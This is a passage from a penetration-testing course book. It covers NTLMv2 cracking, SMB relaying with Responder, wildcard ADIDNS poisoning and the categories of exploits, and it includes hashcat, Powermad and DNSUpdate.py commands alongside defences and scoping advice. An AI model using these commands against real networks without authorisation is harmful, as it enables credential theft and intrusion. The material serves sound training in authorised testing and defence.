So, how can we now use these NTLMv2 challenges and responses? As we will see in the next few slides, relaying them is an interesting attack vector! There are other options, however. We could also try to deduce the password by launching dictionary or brute force attacks against the challenge response. In this case, we would take the challenge and attempt all possible passwords/hashes to calculate a response identical to the one that was captured. When it's found, we have the valid credentials that were entered.

Hashcat (a well-known hash cracking tool) has built-in support to run dictionary and brute force attacks against NTLMv2 challenge responses. The command line syntax would look like this:

hashcat -m 5600 hash.txt password\_list.txt -o cracked.txt

5600 is the hash type for NetNTLMv2

hash.txt contains the hash to be cracked

password\_list.txt is the dictionary file including all passwords we want to try

cracked.txt is where we want to write our output

![](SEC560_Book2_page_115_Figure_0.jpeg)

SMB relaying is an attack where we relay attempted NTLMv2 authentication against our machine to another system in order to obtain unauthorized access to this machine. Typical use cases include automated vulnerability scanners, which are scripts created by administrators. So, how does it actually work?

As a first step, we need to lure a victim into attempting to authenticate against our "evil" machine. This may sound hard, but there are several ways in which we can achieve this. We will look at some examples in the next few slides.

The received authentication request is forwarded by us to the actual target (e.g., a Windows server).

The Windows server (target) responds to us with an authentication challenge.

We forward the authentication challenge to the victim.

The victim calculates a response using their credentials, which are sent to us.

We forward the response to the Windows server.

If authorized, the target Windows server authenticates us.

In order to "close the loop," we forward an "authentication failure" message to the victim.

For simplicity reasons, we've omitted a possible "domain-based" environment in the diagram above (the Windows server does local authentication). In a domain-based environment, the Windows server would forward the challenge and response to a domain controller.

![](SEC560_Book2_page_116_Figure_0.jpeg)

For maximum effect, we could combine Responder with the SMB relaying attack! The initial authentication request required by the SMB relay attack could be obtained by Responder's multicast resolution capabilities (using NBT-NS or LLMNR)! Consider the following attack flow:

The victim workstation attempts to resolve a domain name through NBT-NS or LLMNR because the requested domain name doesn't have a DNS entry (e.g., because they made a typo: "FILESEERVER" instead of "FILESERVER").

We use Responder to respond to the multicast resolution request.

The victim attempts to authenticate toward us.

The received authentication request is forwarded by us to the actual target (e.g., a Windows server).

The Windows server (target) responds to us with an authentication challenge.

We forward the authentication challenge to the victim.

The victim calculates a response using his/her credentials, which is sent to us.

We forward the response to the Windows server.

If authorized, the target Windows server grants us authentication.

In order to "close the loop," we forward an "authentication failure" message to the victim.

![](SEC560_Book2_page_117_Picture_2.jpeg)

# **Responder Attacks: Understanding the Defenses**

Simple strategies to defend against Responder attacks:

- **Disable NBT-NS, LLMNR, mDNS**: Disable these via GPO
- **SMB signing**: Prevents NTLM relay (can break legacy systems)
- **Disabling "Autodetect Proxy Settings"** via GPO
- **Create a WPAD DNS entry** to the corporate proxy
- **Client isolation**: Private VLANs prevent end-user systems from communicating with each other

The above-described attack strategies can be defended against, but the required security controls are not "quick wins" and are thus typically not properly configured:

NBT-NS and LLMNR can be disabled via Group Policy (Group Policy Object, or GPO). When this is disabled, the systems will not send broadcast messages to resolve system names.

SMB signing will prevent NTLM relay attacks using SMB. SMB signing is enabled by default only on Windows Domain Controllers but can additionally be enabled on other systems as well. Note: Several reports indicate that SMB signing will lead to a reduced performance (file transfer) of up to 15%. Furthermore, it could break compatibility with third-party software: McAfee lists in its internal KB that SMB signing should be disabled if NTLM authentication is to be used.

When a WPAD DNS entry exists that actually points to the corporate proxy server Responder (and other tools) can't override the entry.

Disable "Autodetect Proxy Settings" in the browser so the system never attempts to resolve the WPAD address.

Isolate clients using, for example, private VLANs. This prevents hosts from communicating with each other. In such a scenario, if we plug into the network, we would not be able to communicate with other workstations (this prevents us from soliciting hashes).

117

# **Responder Limitations**

![](SEC560_Book2_page_118_Picture_3.jpeg)

- A DNS lookup must fail before name resolution can be poisoned
- Hardened Windows systems do not use NBT-NS, LLMNR, or mDNS
- Name resolution poisoning typically only works within a single broadcast domain
- Responder is often less effective when testing from a VM in the target's virtualization environment
- It is rarely used by real threat actors

Responder is an extremely effective penetration testing tool, but it has its limitations.

First, poisoning name resolution via NBT-NS, LLMNR, and mDNS requires the attacking system to be on the same broadcast domain as the victims. In rare instances, routers may forward mDNS to enable AirPlay and Chromecast; however, that is unusual in a corporate network. So, the total number of potential victims is limited.

Second, when broadcast and multicast name resolution protocols are disabled throughout the organization, name poisoning attacks are far less effective because the attack then depends on exceptions to policy or misconfigured systems that have gone unnoticed.

Third, penetration tests are often executed from a virtual machine deployed in the target's virtualization infrastructure. In those instances, it is extremely common for servers to comprise most of the systems in the same broadcast domain as the attacking system. While a Windows server can still fall victim to name poisoning attacks, it is less common. Additionally, server subnets often include Linux and Unix systems that are less likely to be misconfigured.

Lastly, while not a limitation of Responder itself, real threat actors are rarely caught using the tool or its technique. To some extent, this makes sense, as DNS fallback isn't generally logged, whether it's successful or not.

While penetration tests should call out all validated vulnerabilities, it is equally important to characterize the risk appropriately. There may be other vulnerabilities or misconfigurations that are more likely to be attacked by a threat actor. Since our job is to emulate real-world, realistic adversaries, it's counterproductive to emphasize the business risk from a flaw that is less commonly exploited by real-world adversaries.

![](SEC560_Book2_page_119_Picture_0.jpeg)

![](SEC560_Book2_page_119_Picture_2.jpeg)

# **Active Directory Integrated DNS Attacks**

- In Active Directory Integrated zones, Authenticated Users can use Dynamic DNS to create and modify DNS records
  - − Only the user that created a Dynamic DNS record or an admin can modify it
  - − This technique is useful but requires victims to query DNS for the record
- A more effective option is to create a wildcard (\*) DNS record
  - − If a wildcard record does not exist, Authenticated Users can create one via LDAP
  - − Once created, any query from anywhere in the enterprise for a name that does not exist will resolve to the specified IP

Name resolution poisoning with NBT-NS, LLMNR, and mDNS is only possible after a host fails to resolve a name to an IP address via DNS. Just because those protocols are disabled does not mean Responder isn't useful. As an Authenticated User, it's possible to use dynamic DNS to update an Active Directory Integrated zone with a DNS record. The user who creates a record is granted full control of the record and can update it later if necessary. This functionality is most often used by Active Directory computer accounts to register their name and IP address in DNS.

In a penetration test, the feature allows testers to create valid DNS records with unprivileged permissions. With dynamic DNS, a single name will be mapped to a single IP address if the name doesn't exist. The attack would require something else to trigger the name resolution, such as clicking a link.

A more effective option for penetration testers is to create a wildcard (\*) DNS record pointing to an IP address running Responder. While broadcast name resolution protocols only work within the broadcast domain, a wildcard DNS record extends the reach of Responder to the entire enterprise. Any authenticated user can create a wildcard record if one does not already exist.

#### Reference:

• https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/

![](SEC560_Book2_page_120_Figure_0.jpeg)

While traditional Responder attacks are limited to the broadcast domain of the attacking system, a wildcard DNS record can be used to attack any system in the enterprise. This includes hosts in different subnets, and even hosts in different locations.

Because of the increased scope of the attack, it is important to use this carefully. Creating a wildcard record could produce more traffic than anticipated. It's also possible that the attack will compromise credentials from systems and users that are out of scope, such as systems or users on a partner company's network. This attack should be discussed in-depth during the Rules of Engagement phase of pre-test planning.

![](SEC560_Book2_page_121_Picture_2.jpeg)

# **Creating a Wildcard DNS Record**

- On Windows, Powermad can create dynamic DNS records and Wildcard DNS records
  - − Powermad uses the system's IP unless you provide an IP via the -Data parameter

```
PS C:\Tools\Powermad> Enable-ADIDNSNode –Node * -Data $ResponderIP
```

• On Linux, DNSUpdate.py can create and delete a wildcard DNS record

```
$ DNSUpdate.py -DNS $DNS-IP -u $USER -p $PASS -a ad –r '*' –d $ResponderIP
```

Powermad: https://github.com/Kevin-Robertson/Powermad DNSUpdate.py is included with Responder

Powermad stands for PowerShell MachineAccountQuota and DNS exploit tools. It is written and maintained by Kevin Robertson. Beyond wildcard DNS records, the tool can abuse other common Active Directory weaknesses and misconfigurations. To create a wildcard DNS record, import the module and then use the Enable-ADIDNSNode command:

PS C:\Tools\Powermad> Import-Module .\Powermad\Powermad.psm1

PS C:\Tools\Powermad> Enable-ADIDNSNode –Node \* -Data \$ResponderIP

While traditional Responder attacks leave no lasting impact, a wildcard DNS record persists unless it is removed or disabled. Powermad provides a command to disable the record:

PS C:\Tools\Powermad> Disable-ADIDNSNode -Node \* -Verbose

DNSUpdate's only purpose is to create DNS records via LDAP as an authenticated user. It is included with the additional tools and scripts that come with Responder.

![](SEC560_Book2_page_122_Picture_0.jpeg)

![](SEC560_Book2_page_123_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing

Lab 2.2: Password Guessing

- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks

Lab 2.3: Azure Recon and Password Attacks

- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter

Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_124_Picture_2.jpeg)

# **What Is Exploitation?**

- Exploit: Code or technique that a threat uses to take advantage of a vulnerability
  - − Often remote access to a machine in the form of a "shell"
    - Possibly with limited privileges
    - Perhaps with superuser privileges
  - − Some examples of what you can do once you've exploited a target:
    - Move files to a target machine
    - Take files from a target machine
    - Sniff packets at the target
    - Reconfigure the target machine
    - Install software on a target machine

Before we discuss how to exploit target systems, we need to define exploitation. As we discussed in 560.1, an exploit is code or a technique that a threat uses to take advantage of a security vulnerability on a target system. For a penetration tester, exploiting a target machine is gaining some form of access to the system, usually to run commands on it. We also use the phrase "compromising a machine" in a similar fashion. According to Wikipedia, an exploit is "a piece of software, a chunk of data, or a sequence of commands that takes advantage of a bug or vulnerability to cause unintended or unanticipated behavior to occur on computer software, hardware, or something electronic (usually computerized)" (https://en.wikipedia.org/wiki/Exploit\_%28computer\_security%29).

Our exploitation may give us limited privileges on the system, running a limited set of commands as a lowly user account. Or our exploit may provide superuser privileges on the machine (UID 0 on Linux/UNIX or Administrator or SYSTEM on Windows). Alternatively, our initial exploit may give us limited privileges, which we then escalate with a local privilege escalation attack to get superuser rights on the box.

The commands we run on the target machine that we've compromised with our exploit may allow us to move files to or from the machine. We could upload programs or take appropriate information from a machine in an authorized fashion according to our Rules of Engagement. We might run programs on it, including a sniffer that could capture packets traversing the network on which the target machine sits. We could reconfigure the machine, altering its settings so that it is more useful in subsequent testing, possibly as a jump-off or pivot point to exploit other systems. We might even install software packages on the machine.

Of course, any of these actions is significant and could impact a production environment in profound ways, especially reconfiguring the target machine or installing software that may interfere with existing software on the target.

124

# **Why Exploitation?**

- Proof of vulnerability
  - − Successful exploitation demonstrates risk
- False positive reduction/elimination
  - − Note: Failure does not necessarily mean it isn't vulnerable, and you may still want to report the vulnerability
- Use of one machine as a pivot point to get deeper inside the network
  - − Model real-world attacker actions
- Exploitation leads to post-exploitation
  - − Helps us understand the business risks due to discovered vulnerabilities

![](SEC560_Book2_page_125_Picture_11.jpeg)

Why would we consider exploiting a target machine during a test? First, keep in mind that not all tests actually involve exploitation. Some target organizations merely want a list of potential vulnerabilities, or even just open ports for their test results, without any more detailed confirmation of the exploitability of the targets.

Other organizations scope tests to include exploitation for several reasons. First, by actually exploiting a system, we can reduce the number of false positives we get from our vulnerability scanning tool. After all, if the exploit works in compromising the target machine, we have confirmed that the vulnerability is actually present. Note that if an exploit does not work, there still might be a significant vulnerability on the target. However, the given exploit code the testers used might have flaws, causing it to fail. Another evil attacker might have a different and better exploit that would succeed. Thus, we still should report discovered potential vulnerabilities, even though we cannot successfully exploit them.

A successful exploit also offers proof that a vulnerability exists, helping motivate the target organization to address its true risk in a more effective manner.

Furthermore, by compromising one machine, we may use that system as a pivot point to discover, scan, and exploit additional systems. For example, by compromising one machine on a DMZ, we can then use that system to compromise other machines on the DMZ or possibly the internal network. Alternatively, if the penetration test includes client-side exploitation within its scope, we may compromise an internal system and then pivot through it to get access to internal servers or even DMZ servers, a powerful form of attack that mimics what many real-world bad guys do today. But we should do such pivoting only if it is explicitly agreed to by target organization personnel.

And that gets us to the most valuable part of exploitation: it allows us to perform post-exploitation activities that let us better understand and demonstrate the business implications and risks associated with the vulnerabilities we've exploited. That's why we'll spend a good deal of time in this section discussing post-exploitation activities.

# **Risks of Exploitation**

Understand the probabilistic nature of exploit success!

- Service crash
- System crash
- System stability or integrity impacted
- Data exposure with legal ramifications (don't be the breach!)
- Inadvertently accessing the wrong system
  - − Out of scope or even the wrong target organization

# Test riskier exploits off-hours or during a maintenance window

Exploiting target machines does bring some significant risks, however, which must be carefully discussed with target organization personnel.

Exploitation could cause a target service to crash, resulting in a denial-of-service condition. On a critical production system, such service interruption could result in significant damages from financial, reputational, and other perspectives. Beyond the crash of an individual service, the entire target system could crash, causing several services to come offline. Or, instead of bringing a system down immediately, an exploit could make it unstable.

Thus, the service or system continues to run but has problems intermittently that might be difficult or impossible to track back to the exploitation attempt.

Furthermore, an exploit may violate the integrity of the system, tweaking its configuration or worse. Important and sensitive data could be lost.

Also, by exploiting a system to get access to files or sniff packets from the network, the testing team might see data that it isn't officially authorized to view. In financial services, healthcare, government agencies, and other industries, there could be significant legal implications for testers who view this data because their jobs usually do not have an explicit need for data access.

Another concern with exploitation involves inadvertently attacking the wrong system and successfully compromising it. A penetration tester who isn't careful could compromise systems that are outside of the scope of the project or even outside the target organization, facing significant legal implications.

Because of all these concerns, not only should exploitation be discussed with the target organization in the context of the whole project, but it should also be addressed on a system-by-system basis. That is, before running exploits against a particular machine, check with target organization personnel to make sure the given target is in scope and to find out whether accessing it or viewing data from it has any implications.

![](SEC560_Book2_page_127_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing
  - Lab 2.2: Password Guessing
- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks
  - Lab 2.3: Azure Recon and Password Attacks
- Sniffing and Relaying
- Responder
  - Lab 2.4: Responder
- Exploitation
- Exploit Categories
- Metasploit and Meterpreter
  - Lab 2.5: Metasploit and Meterpreter

# **Categories of Exploits**

- Most exploits fall into one of three categories:
  - − Server-side exploit (sometimes referred to as service-side)
  - − Client-side exploit
  - − Local privilege escalation
- A penetration tester may need to use any one or, more likely, a combination of these kinds of attacks during the course of a single project

Most exploits in use today fall into one of the following three categories:

**Service-side exploits** attack a service that is listening on the network. The service gathers packets from the network, passively waiting for a user on a client machine to initiate a connection. To exploit the service, the attacker generates exploit packets destined for the target service. No user interaction on the target machine is required.

**Client-side exploits** focus on attacking a client application that fetches content from a server machine. Based on user interaction, the client program must actively pull content from a machine configured to exploit it for this kind of attack to work.

**Local privilege escalation exploits** deal with an attacker who already has limited privileges to run code on a target machine. With this attack, the tester exploits some functionality of the target system to jump to higher privileges on the machine, such as root, admin, or SYSTEM privileges. Local privilege escalation attacks may or may not involve user interaction.

A penetration tester may need to use any of these kinds of exploits during a project. A well-stocked arsenal of each kind of exploit can be quite helpful.

New vulnerabilities that fit into these three categories are discovered on a regular basis. Penetration testers and ethical hackers need to stay abreast of current issues as well as important vulnerabilities and related exploits from the recent past.

![](SEC560_Book2_page_129_Figure_0.jpeg)

the network for incoming data

Traditionally, penetration testing and ethical hacking focused on service-side exploits, and these vulnerabilities remain a big part of most tests today. In this kind of attack, a service listens on the target machine. In the vast majority of cases, the service listens on a given TCP or UDP port, although in rare circumstances, a system may be exploitable via an ICMP, a raw IP packet, or other packet type (usually for a vulnerability in the kernel of the target). The TCP and/or UDP port listeners are discovered by the port scanning we discussed earlier in the course.

exploit code to service

The vulnerable service is identified based on OS fingerprinting and version scanning. Given the port number, the version type, and the operating system, the attacker runs a tool that generates suitable exploit packets tuned for the target machine that are fired across the network at the target machine's listening service.

Of course, for a service-side exploit to work, the attacker must get packets to the target service. Thus, if there is some form of firewall filtering between the attacker and the target (such as a network firewall, a network-based Intrusion Prevention System, or even a host-based firewall on the target machine), it must allow inbound access to the service the attacker is attempting to exploit, or the attacker cannot use a service-side exploit against it.

After the attacker gains access to one machine inside the firewall (perhaps with a service-side exploit or even with one of the client-side exploits we'll discuss later), the attacker can use that system to pivot, exploiting other systems.

![](SEC560_Book2_page_130_Figure_0.jpeg)

In the past few years, the number of service-side vulnerabilities and public exploits for those flaws has shrunk. They haven't disappeared, but gone are the heady days of 2000 to 2004 when a new service-side vulnerability seemed to appear every few weeks. Attackers have adapted, and as penetration testers and ethical hackers, we must adapt too if we want to find the kinds of flaws that are commonly exploited today. **Whenever a penetration test or ethical hacking project includes client-side exploitation within scope, the successful compromise of at least one target is common.**

Today, the vast majority of vulnerabilities are discovered in client-side software. In these attacks, a user at a client machine runs a program that initiates an outbound connection to a server somewhere on the

software. The attacker may own the server machine, or it could be a third-party system on which the attacker has posted exploit code. From an attacker's perspective, the upsides of client-side attacks are:

The attack will work as long as the firewall allows outbound access from the target machine, and most firewalls allow such outbound access for some of the most vulnerable client programs available: browsers.

The attacker doesn't have to target a single user but can instead spread a net for various users who may access the attacker's machine.

There are some downsides for the attacker, as well, however:

User interaction is typically required to run the client program and initiate the connection.

The exploit will typically get the privileges of the client program, which may not be running with root, admin, or SYSTEM privileges (although, sometimes, it is).

The attacker must solicit traffic from the victim machine. This is often done via email, DNS manipulation, social engineering, and other tricks.

# **Rule of 2: The Google Guideline**

If software does all three of the below, it will *always* have vulns:

#### • **Untrustworthy Inputs**

− User content like PDFs, web input, Office docs

#### • **Unsafe Language**

− Manual memory management (C, C++) results in miscalculations, stack- or heapbased overflow

#### • **No Sandbox**

- − Limits the damage of exploitation
- − Incredibly rare outside of web browsers and AV/EDR

![](SEC560_Book2_page_131_Picture_11.jpeg)

Google's "Rule of 2" is a security principle that aims to predict the vulnerability footprint of a software system based on three critical risk factors. If a software system encompasses all three factors, it is almost guaranteed to harbor vulnerabilities:

**Untrustworthy Inputs**: Software that processes user-generated content—such as PDF files, web form inputs, or Office documents—is exposed to a variety of inputs that can be maliciously crafted. This exposure significantly increases the risk of security flaws because the software must handle data that it cannot inherently trust.

**Unsafe Language**: The use of programming languages that require manual memory management, like C and C++, can lead to common programming errors such as buffer overflows and memory leaks. These languages give developers more control but also require them to manage memory directly, which can lead to miscalculations and subsequently to stack- or heap-based overflows. Mitigations such as DEP, ASLR, Control Flow Guard, and more do add requirements to the attacker seeking to exploit the software in question, but nonetheless, real-world attackers are finding ways to exploit modern software security mitigations.

**No Sandbox**: Sandboxing is a security mechanism for separating running programs, usually minimizing the damage potential if an application is compromised. It is particularly crucial for software that interacts with untrusted inputs or performs risky operations. The absence of a sandbox means that if the software is exploited, the impact can extend to the underlying system or network. Sandboxing is commonly implemented in web browsers and antivirus/endpoint detection and response systems, but is rare in other types of software.

According to Google, the combination of these three factors creates a high-risk environment where vulnerabilities are not just possible but are likely. This guideline underscores the importance of cautious design choices in software development, promoting the use of safer languages, rigorous input validation, and robust isolation techniques to mitigate potential security threats.

![](SEC560_Book2_page_132_Picture_2.jpeg)

# **Notable Client-Side Exploits: Commonly Vulnerable Software**

- Browsers:
  - − Internet Explorer and Microsoft Edge
  - − Firefox
  - − Chrome
  - − Safari
- Document-reading applications:
  - − Adobe Reader and Acrobat
  - − Microsoft Word, PowerPoint, Excel
- Runtime environments:
  - − Java

![](SEC560_Book2_page_132_Picture_14.jpeg)

On the client side, there are a plethora of exploitable vulnerabilities. The target applications tend to fall into one of these categories:

**Browsers:** In the last several years, there have been numerous flaws in browsers that are readily exploitable using public free exploitation tools. Many of these exploits are of high quality, operating reliably with high success rates. Internet Explorer and Microsoft Edge are significant attack targets. Firefox also has had some significant flaws and is less quickly patched than Microsoft browsers in some enterprises, making it a prime target. In addition, Chrome and Safari have a significant history of vulnerabilities.

**Document-reading applications:** These applications have had a rough time in the past couple of years, with major vulnerabilities discovered on a regular basis in various Microsoft Office products, such as Word and PowerPoint. One of the biggest areas of exploitation here is Adobe Reader, which has had several flaws and is often not patched by enterprises on a regular basis. Also, Adobe Acrobat has had several flaws.

**Runtime environments:** There are exploits for Java that break out of the Java sandbox on the client and run code of an attacker's choosing on the underlying operating system.

These aren't the only exploitable client programs available, but these categories tend to offer testers the most fertile attack surface.

![](SEC560_Book2_page_133_Picture_2.jpeg)

# **Mounting a Client-Side Exploitation Campaign**

- For client-side exploitation pen tests, some pen testers send email to in-scope target addresses and try to exploit anyone who clicks the link
  - − This is dangerous because someone may forward your email
  - − You could limit your exploit to attack only certain IP addresses, but it is still easy to stray outside of the scope
- We recommend another approach: split the project in two
  - − First, send a spear-phishing email with a link or attachment and then count the number of clicks you get. **Do not exploit.**
  - − Second, with a collaborator operating or remote access on a client machine, click links and try to exploit
  - − Phase 1 gives you stats safely
  - − Phase 2 lets you determine what's possible given the Phase 1 clicks

When conducting client-side penetration tests, some penetration testers send spear-phishing emails to a group of in-scope client email addresses and then try to exploit every client system where someone clicks the link from the email. Unfortunately, this approach is dangerous in that one of the in-scope target recipients may forward the email to someone outside of the project scope, perhaps even someone in a different company or government agency. Attacking this forwarded recipient when they click a link could get the penetration tester in a lot of legal trouble. Some penetration testers try to finesse the situation by configuring their exploitation tools to exploit only in-scope IP addresses. However, because these addresses may be behind NAT devices that make many different machines appear to come from a single IP address, these approaches could still result in attacking an out-of-scope machine.

A much better way to conduct a client-side exploitation project is to split the project into two components. Instead of sending spear-phishing email to a group of addresses and then exploiting any client that clicks the link, you could instead unbundle the project into two phases. In Phase 1, you send the spear phishing email and configure your web server to merely count the number of clicks you get on a link in the email, without exploiting any of the systems included in this phase. That approach safely provides the statistics you want about user click rates under spear-phishing attacks. For Phase 2, the tester and the target organization choose one specific collaborator for the tester, who will knowingly surf to any URLs provided by the tester. The pen tester then tries to exploit just that collaborator's machine or a small number of systems, a representative sample of the target environment. With the Phase 2 exploitation results, we may pivot and engage in other post-exploitation activities, such as plundering, which we'll discuss later in this section.

Our results from Phase 2 can let us infer what we may have achieved with any of the clicks we measured in Phase 1. In the end, this approach provides useful statistics (Phase 1) and reasonable conclusions about the potential impact of client-side exploitation (Phase 2) in a relatively safe fashion, staying within scope.

# **Client-Side Exploits and Guardrails**

"Guardrails" limits execution to specific machines.

- Useful in reducing the likelihood of going out of scope
- Can work to bypass/detect sandbox
  - − Don't run if in a VM, if not joined to the domain
  - − Only run if specific software is installed
  - − Key the internal domain; decrypt and execute based on the domain name
- Similar to VM/Sandbox evasions, but target-specific (e.g., domain)

Guardrails can be an important piece of your payloads to reduce the likelihood of going out of scope. If you send an email with an attack payload, the payload can be set to only fully execute under specific criteria. We can use a guardrail to detect if the payload is running in a VM, and then not execute. This is similar to, but not the same as, VM detection. Guardrails go a step further and take actions based on the knowledge of what should be in an environment.

#### Reference:

• https://attack.mitre.org/techniques/T1480/

134

![](SEC560_Book2_page_135_Picture_1.jpeg)

# **Using Payloads on Target Systems**

- Remote desktop or VPN (preferred)
  - − Allows the tester to quickly iterate through payloads
- Manual user intervention, coordinated via telephone
  - − Testing is only as fast as the helper, and the helper has other things to do
- Email with links or attachments
  - − Payloads may be filtered (but that could be a valid test too!)

After we develop an inventory of client-side programs, how can we then test whether those programs are exploitable? We need to have those client machines access our testing systems so that we can serve up a series of exploits. There are several methods for making this happen, including:

**Remote desktop or VPN:** Oftentimes, the testers will access the target system to interact with the payloads. This is an efficient method that allows the tester to quickly iterate should a payload be blocked or ineffective.

**Manual user intervention:** The tester could coordinate with target personnel, asking them to use a stock laptop or desktop machine to surf to a variety of URLs provided to the tester over the phone. From a positive perspective, this approach allows for careful coordination, back-and-forth discussions, and retries in real time. From a negative perspective, it consumes the time of likely busy target personnel.

**Email with links:** The tester could send email with links that point back to the tester's machines with exploits ready to be served. Target personnel would have to click these links, of course, to automatically invoke the appropriate client software to access the tester's environment. The Core IMPACT commercial exploitation tool includes functionality that will automatically generate and send email containing links. Alternatively, you could generate such email manually. Be careful in determining who you send these email messages to, making sure that such recipient personnel are explicitly in the project's scope.

![](SEC560_Book2_page_136_Picture_2.jpeg)

# **Use Appropriate, Representative Client Machines**

Use a computer and account from a recently separated employee to get the best "representative sample" system.

- Gold images and accounts often don't have all the software and access a real user needs to perform their duties
- During the first few weeks, new employees often need to make multiple requests to get the access and software they need
- Often, a tester hears, "I'm almost ready for the test—just let me update my patches"
  - − Such a test does not actually reveal the true risks of the target organization
  - − Politely explain this to target personnel
  - − Make sure the Rules of Engagement or scoping agreement mentions using a "representative sample" machine or a system from a separated user

When performing this client-side testing, make sure that target personnel use a representative sample of one or more client machines to access your test environment. Quite often, when conducting such tests, target personnel say, "OK, I'm almost ready to access your systems, but let me just update my patches first." This happens all the time and is, unfortunately, not an adequate test of the risks faced by the target organization. Make sure that a stock laptop that has the same patch level as the common users in the target environment is employed. You also may want to have this understanding included in the project's Rules of Engagement or scoping agreement.

![](SEC560_Book2_page_137_Picture_2.jpeg)

# **Local Privilege Escalation Exploits**

"PrivEsc" flaws allow a user to jump from a limited privilege account to higher privileges.

- root / UID 0 on Linux or UNIX
- Administrator or SYSTEM on Windows
- Requires some type of access to the system
  - − Many vendors rate the vulnerabilities less severe (since they require existing access), so they are less likely to be patched
  - − Examples: Client-side exploit, service-side exploit, password guessing, password sniffing, and so on
- Can allow tester to read arbitrary files from the system, install software, run a sniffer, and more

# Target Machine

![](SEC560_Book2_page_137_Picture_12.jpeg)

Besides service-side and client-side exploits, a third category of exploit often becomes important when a tester compromises a machine: local privilege escalation exploits. With these issues, an attacker must first have some form of access to a machine, with the ability to run commands on it with limited privileges. The attacker may have gotten such access by using a client-side or service-side exploit of a program running with limited privileges. Or the attacker may have successfully guessed a password to a lowerprivileged account. Alternatively, the attacker may have sniffed a password from the network as it passed by a machine on which the attacker already gained high-privileged access to run a sniffer. The password gathered by the sniffer may provide limited-privilege access to an account on another system.

In a local privilege escalation attack, the attacker runs code that either makes the current limited-privilege process jump up in privileges to start running with higher rights on the machine or uses the existing limited-privilege process to attack high-privilege processes to make them run code. Both scenarios are a form of local privilege escalation. The goal for either of them is to let the attacker run code with higher privileges, such as root or UID 0 privileges on Linux/UNIX or Administrator or Local SYSTEM on Windows machines.

After the attacker attains superuser privileges, they can then read any file on the machine that is not encrypted, install software on the system (including attack tools to target other systems), run a sniffer that grabs packets passing by the network interface of the target machine, monitor the system at a fine-grained level, and so on.

Many organizations do not patch local privilege escalation vulnerabilities quickly because most vendors do not rate such issues as Critical. Microsoft, as well as many other vendors, tends to rate such issues as Important, at best.

![](SEC560_Book2_page_138_Picture_2.jpeg)

# **Local Privilege Escalation Attack Categories and Suites**

- Race conditions (commonly a "time of check, time of use" issue)
- Attacks against the kernel
- Local exploit of privileged program or service
  - − Linux/UNIX: SetUID 0 executables
  - − Windows: Attacks against processes such as csrss.exe, winlogon.exe, lsass.exe, and so on
- For Windows, Metasploit Meterpreter "post" modules
- For Linux, use the Linux Exploit Suggester:
  - − https://github.com/mzet-/linux-exploit-suggester
- Look for misconfigurations (not missing patches) with linPEASS:
  - − https://github.com/carlospolop/PEASS-ng

There are numerous types of local privilege escalation attacks, but they tend to fall into the following categories:

**Race conditions:** This kind of issue involves two different actions happening on a system in an indeterminate order (nearly at the exact same time), with different results if one action finishes before the other. In some local privilege escalation attacks, some systems have features that check to see if a program has the privileges needed to perform a given action while the action itself is initiated. If the action finishes before the privilege check is done, a privilege escalation attack could occur.

**Kernel attacks:** The heart of most operating systems, the kernel may have flaws that allow an attacker to run code that makes calls into kernel functionality, carefully orchestrating these calls with input that tricks the kernel into running code of the attacker's choosing with higher privileges.

**Local exploit of high-privileged program or service:** An attacker may use a limited privilege process on a machine to try to execute programs with higher privileges or make calls to a higher-privileged process running on the same system. On Linux/UNIX machines, these attacks tend to focus on SUID root programs or scripts, which always run with UID 0 privileges regardless of the privileges of the account that invokes the script. On most systems, SUID root programs are carefully constructed to make sure they can perform only one given action, such as changing a user's password (which involves editing the /etc/passwd or /etc/shadow file), to minimize the chance of attack. By exploiting a flawed SUID root program, an attacker might trick it into running code. On Windows machines, this kind of attack often happens through exploits of local, high-privileged processes, such as csrss.exe (which controls interactions within user mode), winlogon.exe (which logs users on to a machine), lsass.exe (which provides authorization checks), and so on.

Some tools include a suite of exploits for local privilege escalation. In particular, on Windows, some of the Post modules included in Metasploit implement local privilege escalation attacks. We'll look at the

Meterpreter getsystem command and post modules in more detail during the Metasploit Meterpreter module of the class. For Linux, the Enlightenment Exploit pack includes approximately a dozen different exploits for gaining UID 0 on a target Linux machine via local privilege escalation. One of the best tools for privilege escalation on Linux is the Linux Exploit Suggester: https://github.com/mzet-/linux-exploitsuggester

#### Reference:

• linPEASS: https://github.com/carlospolop/PEASS-ng

![](SEC560_Book2_page_140_Picture_2.jpeg)

#### **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

- Version Scanning with Nmap and Netcat
- Visual Scanning with GoWitness
- Vulnerability Scanning and Analysis
- Nmap Scripting Engine
- OS Detection Techniques
  - Lab 2.1: Version Scanning, OS Detection, NSE, and GoWitness
- Initial Access
- Password Guessing

Lab 2.2: Password Guessing

- Azure Intro
- Entra ID
- Azure Recon
- Azure Password Attacks

Lab 2.3: Azure Recon and Password Attacks

- Sniffing and Relaying
- Responder

Lab 2.4: Responder

- Exploitation
- Exploit Categories
- Metasploit and Meterpreter

Lab 2.5: Metasploit and Meterpreter

![](SEC560_Book2_page_141_Picture_2.jpeg)

# **Metasploit Exploitation Framework**

